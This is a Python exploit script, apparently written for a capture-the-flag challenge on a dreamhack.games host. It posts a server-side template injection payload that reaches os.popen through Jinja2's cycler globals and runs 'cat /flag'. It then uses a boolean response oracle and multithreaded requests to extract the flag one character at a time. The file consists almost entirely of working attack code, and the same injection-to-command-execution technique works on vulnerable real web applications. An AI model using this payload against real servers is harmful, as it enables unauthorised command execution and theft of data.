import requests
import string
import re
from concurrent.futures import ThreadPoolExecutor, as_completed

class Exploit:
    def __init__(self, baseURL, max_workers=5):
        self.baseURL = baseURL.rstrip("/")
        self.charset = string.ascii_letters + string.digits + "}*!@#$%^&()-+_"
        self.prefix = "pokactf2024{"
        self.timeout = 10
        self.max_workers = max_workers

    def send_request(self, payload):
        try:
            r = requests.post(f"{self.baseURL}/cal", data={"a": payload, "b": "0"}, timeout=self.timeout)
        except requests.RequestException as e:
            return False
        text = r.text
        if "Only 0, 1" in text:
            return False
        return bool(re.search(r"(?:<p>\s*1\s*</p>|result\">1|>1<|1</|\n1\n)", text))

    def build_payload(self, current_flag, char):
        q = repr(current_flag + char)
        payload = f"(cycler.__init__.__globals__.os.popen('cat /flag').read().strip().startswith({q}) and 1 or 0)"
        return char if self.send_request(payload) else None

    def extract_flag(self):
        flag = self.prefix
        while True:
            found = False
            with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                futures = {executor.submit(self.build_payload, flag, c): c for c in self.charset}
                for future in as_completed(futures):
                    result = future.result()
                    if result:
                        flag += result
                        print(f"[+] Found Char Flag -> Join Flag: {flag}")
                        found = True
                        if result == "}":
                            print(f"[+] DONE FLAG: {flag}")
                            return flag
                        break
            if not found:
                print("[-] No matching char found. Stopping.")
                return flag

if __name__ == "__main__":
    BASE_URL = "http://host8.dreamhack.games:11732"
    exploit = Exploit(BASE_URL, max_workers=10) 
